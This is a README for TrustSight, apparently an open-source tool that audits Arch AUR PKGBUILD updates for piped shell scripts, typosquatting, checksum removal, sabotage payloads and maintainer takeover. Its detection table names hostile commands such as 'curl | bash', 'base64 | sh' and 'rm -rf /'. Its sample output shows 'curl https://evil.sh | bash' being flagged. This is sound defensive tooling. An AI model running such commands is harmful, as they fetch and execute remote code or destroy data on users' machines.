# TrustSight

<img src="https://raw.githubusercontent.com/emiliano-go/trustsight/refs/heads/master/docs/assets/images/trustsight-banner.png" alt="TrustSight" width="700"/>

Audits AUR PKGBUILD updates before you install: detects structural changes, suspicious commands, typosquatting, and novelty signals, then produces a deterministic evidence report.

<p align="center">
  <a href="https://www.python.org/downloads/">
    <img src="https://img.shields.io/badge/Python-3.11%2B-3776AB?logo=python&logoColor=white&style=for-the-badge" alt="Python">
  </a>
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-10AC84?style=for-the-badge" alt="License">
  </a>
  <a href="https://deepwiki.com/emiliano-go/trustsight/">
    <img src="https://img.shields.io/badge/DeepWiki-8A2BE2?logo=readthedocs&logoColor=white&style=for-the-badge" alt="DeepWiki">
  </a>
  <a href="https://github.com/emiliano-go/trustsight/actions/workflows/test.yml">
    <img src="https://img.shields.io/github/actions/workflow/status/emiliano-go/trustsight/test.yml?branch=master&style=for-the-badge&logo=github&label=Tests" alt="Tests">
  </a>
  <a href="https://pypi.org/project/trustsight/">
    <img src="https://img.shields.io/pypi/v/trustsight?logo=pypi&logoColor=white&style=for-the-badge" alt="PyPI">
  </a>
</p>

---

## Setup

> Not published to the AUR yet: `aur.archlinux.org/trustsight.git` does not exist. Build from the PKGBUILD in this repository.

```bash
# 1. Install
git clone https://github.com/emiliano-go/trustsight.git
cd trustsight/packaging/aur
makepkg -si

# 2. Scan your outdated AUR packages
trustsight review
```

Requires **Python 3.11+** and **Arch Linux** (the tool discovers packages via `pacman -Qm`, `pacman -Sl` for local repos, or `--repo`/`--all-repos` flags).

The analysis is deterministic and calculated locally. Verdicts are template-based, describing each finding in plain English, for example `"Version bump. modified PKGBUILD, .SRCINFO. Signals: checksum disabled; novel dependency 'pyfoo' added in depends."`

Baselines ship as signed GitHub release assets (`baseline-seed.tar.gz`, IOC baselines, the corpus). On an eligible first `review` or `inspect`, the CLI downloads the novelty seed and imports it only after its ed25519 signature verifies against the pinned distribution key; when offline, the attempt is skipped silently and the run starts cold. Other commands do not fetch it automatically. See [installation](https://docs.trustsight.org/getting-started/installation/) for details.

---

## Security model

TrustSight is **evidence-producing**, not proof-of-safety. Read the [full security model](https://docs.trustsight.org/security/) for the threat model, invariants, and enforcement gates. It audits and does not install. The tool never runs the PKGBUILD, never executes extracted commands, and never modifies your system. Every finding is traceable to a specific diff line, URL, or novelty record. The output is a structured evidence report, not a gate. See [what TrustSight cannot see](https://docs.trustsight.org/explanation/what-trustsight-cannot-see/).

---

## What it detects

| Attack / Risk | How TrustSight catches it |
|---|---|
| **Piped shell scripts** (`curl \| bash`, `base64 \| sh`) | Scans every new or changed line for command-subprocess pipelines (R001, ~100% recall on known cases) |
| **Obfuscated commands** (encoded strings, environment subversion like `LD_PRELOAD`) | Resolves variables and decodes known obfuscation patterns; flags build-environment tampering (R007, R070) |
| **Checksum disabled or removed** | Compares old vs new `sha256sums` / `md5sums` arrays (R004, R005) |
| **Source URL typosquatting** (`githab.com` instead of `github.com`) | Character-level edit distance against known forge domains (R008) |
| **Package-name typosquatting** (e.g. `libuvc` resembling `libuv`) | Edit-distance comparison against more popular packages in the seed database (R074) |
| **URL swapped without a version bump** | Tracks source URL changes that are not accompanied by a new version (C003) |
| **Novel / never-before-seen URLs or maintainers** | Compares against the release-channel seed (about 180,000 known source URLs and 35,587 hashed maintainer identities, verified against the pinned key on import); flags first-seen domains and maintainers (novelty tier) |
| **Known-bad indicators** | Matches package URLs and strings against signed, federated IOC baselines from the release channel; reported in the IOC tier, outside the heuristic score |
| **Unicode bidi override attacks** (invisible characters that change how text displays) | Detects directionality overrides and homoglyph codepoints in PKGBUILD content (R013) |
| **Prompt injection** in package metadata | Pattern-matches common injection templates; primary defense is structural (R012) |
| **GPG verification removed** | Detects when `validpgpkeys` was populated and is now empty (R069) |
| **Untrusted maintainer takeover** | A maintainer change to someone never seen before (R071) |
| **Stale package revived** | A package with no updates for over a year suddenly gets one (R067) |
| **Accelerated release cadence** | 3+ commits in the last 24 hours (R073, informational) |
| **Sabotage payloads** (fork bombs, `rm -rf /`, disk wiping, permission sabotage, service disruption, coin miners, log wiping) | Command-position matching that distinguishes the build sandbox from the system: `rm -rf "$srcdir/x"` is housekeeping, `rm -rf /` is not (S001-S008) |
| **Orphan hijacking** (a package adopted from orphan, then its recipe rewritten with no upstream change) | The AUR maintainer field against the last recorded state, plus a recipe-only-change signature and the composition of both with an unpinned build fetch (R141-R143) |
| **Build steps that fetch unpinned code** (`npm install`, `pip install`, `cargo fetch` in a build function) | Not scored - reported as the `unpinned_build_deps` coverage gap, because what the build will run is not in the analysed text and no checksum covers it |
| **Risk in AUR dependencies** | Dependencies are analysed as packages in their own right, to a configurable [depth](#dependency-depth) |

## What it cannot detect

| Limitation | Why |
|---|---|
| **Malicious upstream release tarballs** | TrustSight audits the PKGBUILD, not the binaries it downloads. A clean build file can point to a compromised tarball. |
| **Deliberately unremarkable attacks** | If no commands are added, no URLs change, and no checksums are disabled, there is no diff signal. The update is invisible to this kind of analysis. |
| **Dependencies beyond the configured depth** | AUR dependencies *are* analysed - see [Dependency depth](#dependency-depth) - but only to the configured number of levels. Past that, and past the hard ceilings on an exhaustive walk, the closure is unread and the result says so with a `deps_not_scanned` coverage gap. |
| **Runtime attacks** | The tool never executes the PKGBUILD, never runs extracted commands, and never modifies your system. |
| **Zero-day structural attacks** | Rules are pattern-based and calibrated against a known corpus. A novel attack that leaves no matching pattern will not fire. |

The default review output shows findings and a verdict, not score or risk columns. Add `--score` or `--risk` when you want the numeric band in the terminal. A clean score means no known risk signals fired, not that the package is safe. See [what TrustSight cannot see](https://docs.trustsight.org/explanation/what-trustsight-cannot-see/) for details.

---

## Dependency depth

An AUR package's `depends` and `makedepends` can name other AUR packages, and
`makepkg` builds those on your machine in the same run. Reviewing only the
package you typed reads one recipe out of several that will actually execute -
and a hijacked orphan is far more often somebody's dependency than the thing
you meant to install.

So AUR dependencies are analysed by default.

| Depth | Behaviour |
|---|---|
| `0` | Dependencies are not analysed. |
| `1` | Direct AUR dependencies. **The default.** |
| `n` | `n` levels. |
| `-1` | Every level there is, up to the hard ceilings below. |

```bash
trustsight inspect some-pkg              # depth 1, the default
trustsight inspect some-pkg --depth 0    # this package only
trustsight inspect some-pkg --depth 3    # three levels
trustsight review --depth -1             # the whole closure
```

Set it permanently in `config.toml`:

```toml
[depth]
levels = 1
```

Three things worth knowing:

**Each dependency is analysed as a package**, not as a component of one. It
gets its own score, its own band, its own coverage gaps and its own row in the
database, and it renders as a mini-card nested inside the parent's card.
Nothing is folded into the parent's score - `depth` is deliberately not part of
the config fingerprint, so a score that moved when you passed `--depth` would
make two operators' results incomparable.

**`-1` is bounded.** The dependency graph is written by the party under review:
a recipe declaring five hundred AUR `makedepends`, each declaring five hundred
more, would otherwise decide how many repositories your machine clones. The
ceilings are 8 levels and 200 dependencies per run.

**A walk cut short says so.** Hitting a ceiling, or failing to analyse a
dependency, records the `deps_not_scanned` coverage gap, which forbids an
UNFLAGGED result. A walk that *completed* is not a gap: asking for depth 1 and
getting depth 1 is a complete answer to the question you asked.

Dependencies are read from the corpus metadata snapshot when you have one (no
extra network), otherwise from one batched AUR RPC request per level. Only
`depends`, `makedepends` and `checkdepends` count - `optdepends` is not
installed by default. The first run clones each dependency; later runs reuse
the cache.

---

## The 30-second example

```bash
trustsight review --score
```

```
╭────────────────────────── chez-scheme-bin ───────────────────────────╮
│  Version  10.0.0-1  →  10.1.0-2                                     │
│  Status   Only pkgver and sha256sums changed. Review the diff        │
│           before building.                                           │
│  Changed  pkgver 10.0.0-1 -> 10.1.0-2                               │
│           checksums checksum added or changed                        │
│  Score    0/100 (Low)                                                │
╰──────────────────────────────────────────────────────────────────────╯
╭──────────────────────────── sketchy-pkg ─────────────────────────────╮
│  Version  1.4.2-1  →  1.5.0-2                                       │
│  Status   The update is not trivial. Review it.                      │
│           PKGBUILD line 4 [R001]  Remote Script Execution: curl      │
│           https://evil.sh | bash [R001]                              │
│            [SOURCE_BUCKET]  Source URL classified as unknown         │
│           (https://evil.sh) [SOURCE_BUCKET]                          │
│  Changed  source host added: evil.sh                                 │
│  Score    60/100 (High)                                              │
╰──────────────────────────────────────────────────────────────────────╯
2 package(s) needing update and reviewed out of 2 installed, 1 above the
20-point UNFLAGGED threshold
```

One panel per package, and every signal is shown with the file, line and rule
that produced it. You see **why** the score is what it is.

The `--score` flag is doing real work here. Without it the score and the band
are withheld and every panel border is neutral: the evidence is the default
output, and the number is something you ask for. `--risk` shows the band
alone.

---

## Commands

| Command | What it does |
|---|---|
| [`trustsight review`](https://docs.trustsight.org/reference/cli/#trustsight-review) | Scan outdated AUR packages and produce a findings table with tiered evidence. Supports `--repo`, `--foreign`, `--all-repos`, `--verbose`, `--depth` flags. |
| [`trustsight inspect <package>`](https://docs.trustsight.org/reference/cli/#trustsight-inspect-package) | Deep-dive on a single package: findings, source URLs, resolved commands, novelty context, and its AUR dependencies (`--depth`). |
| [`trustsight history <package>`](https://docs.trustsight.org/reference/cli/#trustsight-history-package) | Show past analysis results for a package. |
| [`trustsight forget <package>`](https://docs.trustsight.org/reference/cli/#trustsight-forget-package) | Remove a tracked package and all its history, or prune packages that no longer exist in the AUR (`--prune`). |
| [`trustsight list`](https://docs.trustsight.org/reference/cli/#trustsight-list) | List all packages tracked in the database. |
| [`trustsight status`](https://docs.trustsight.org/reference/cli/#trustsight-status) | Show database and system health statistics. |
| [`trustsight config`](https://docs.trustsight.org/reference/cli/#trustsight-config) | Manage configuration (`show`, `set`, `sync-rules`). |
| [`trustsight seed-db`](https://docs.trustsight.org/reference/cli/#trustsight-seed-db) | Import a novelty seed (`.db`, `.db.gz`, or a v2 `.tar.gz`). The release-channel seed imports automatically on first review. |
| [`trustsight seed`](https://docs.trustsight.org/reference/cli/#trustsight-seed) | Inspect the hashed maintainer seed, fetch the verified release-channel seed, or migrate legacy plaintext rows. |
| [`trustsight db`](https://docs.trustsight.org/reference/cli/#trustsight-db) | Database maintenance (`check`, `vacuum`, `backup`). |
| [`trustsight override`](https://docs.trustsight.org/reference/cli/#trustsight-override) | Suppress a rule that misfires on your packages. |
| [`trustsight lint-rules`](https://docs.trustsight.org/reference/cli/#trustsight-lint-rules) | Check `rules.toml` for unreachable or malformed rules. |
| [`trustsight full-aur`](https://docs.trustsight.org/reference/cli/#trustsight-full-aur) | Bootstrap or update the full-AUR baseline corpus; `--watch` runs repeated cycles on an interval. |
| [`trustsight baseline`](https://docs.trustsight.org/reference/cli/#trustsight-baseline) | Build or import a full-AUR baseline artifact, optionally signed with your key. |
| [`trustsight import-baseline`](https://docs.trustsight.org/reference/cli/#trustsight-import-baseline) | Verify and import a signed baseline artifact. |
| [`trustsight ioc`](https://docs.trustsight.org/reference/cli/#trustsight-ioc) | Manage IOC federation baselines (`update`, `list`, `export`, `sources`). |
| [`trustsight corpus`](https://docs.trustsight.org/reference/cli/#trustsight-corpus) | Corpus-wide queries over the full-AUR baseline (`pivot`, `import`, `export`). |

---

## Use it from Python

Every flow above is available as a library through [`trustsight.api`](https://docs.trustsight.org/reference/python-api/), which returns dataclasses instead of printing. Nothing else under `trustsight.` is public.

```python
from trustsight import TrustSight

ts = TrustSight()

report = ts.inspect("some-package")
print(report.risk_label, report.verdict)

result = ts.review(limit=25)
for r in result.flagged:
    print(r.package, r.risk, r.verdict)
for failure in result.failures:
    print("NOT VETTED:", failure.package, failure.error)

for cycle in ts.watch(interval=1800):     # full-aur --watch, as a generator
    for package, rule_id in cycle.new_alerts:
        print(rule_id, package)
```

Two rules carry over from the CLI. Use `report.risk`, never a band re-derived from `report.score`: an analysis that could not read the whole change reports `Inconclusive` regardless of the number. And check `result.failures`, because a package that could not be analysed is a result, not an absence. `result.to_dict()` follows `review --json`: it is one flat list containing successful report rows and failed rows marked `failed: true`.

---

## How scoring works

Scoring is fully deterministic: same input always produces the same score. The pipeline is:

1. **Diff** the old and new PKGBUILD
2. **Apply rules** to detect structural changes, suspicious commands, typosquatting, etc.
3. **Classify URLs** into trust buckets (official, self-hosted, unknown, homograph)
4. **Check novelty** against the local database of known URLs and maintainers
5. **Calculate score** from 0-100 by summing weighted contributions across four evidence tiers

Signals come from 145 documented rules across five scoring namespaces: 119 detection rules (R-series, part TOML-configurable and part code-emitted), 7 code-structure rules (C001-C007), 4 dependency-graph rules (D001-D004), 8 sabotage rules (S001-S008) and 7 crossfire anti-evasion rules (X001-X007). A sixth namespace, declared practice (P001-P007), reports at weight 0 and never scores. All of it is calibrated against a locked 3,739-diff benign corpus of real AUR updates, with 175 committed malicious fixtures on the other side.

Verdicts are template-based, describing each triggered finding in plain English. The score is never influenced by the verdict text.

See [scoring philosophy](https://docs.trustsight.org/explanation/scoring-philosophy/).

---

## License

MIT

---

## Documentation hub

| Section | Description |
|---|---|
| [Getting Started](https://docs.trustsight.org/getting-started/) | One-tutorial path from install to first review |
| [Full documentation](https://docs.trustsight.org/) | Docs landing page |
| [Contributing](https://docs.trustsight.org/contributing/) | How to report bugs, contribute code, improve docs |
| [Security](https://docs.trustsight.org/security/) | Vulnerability disclosure policy |
| [License](https://docs.trustsight.org/license/) | MIT full text |
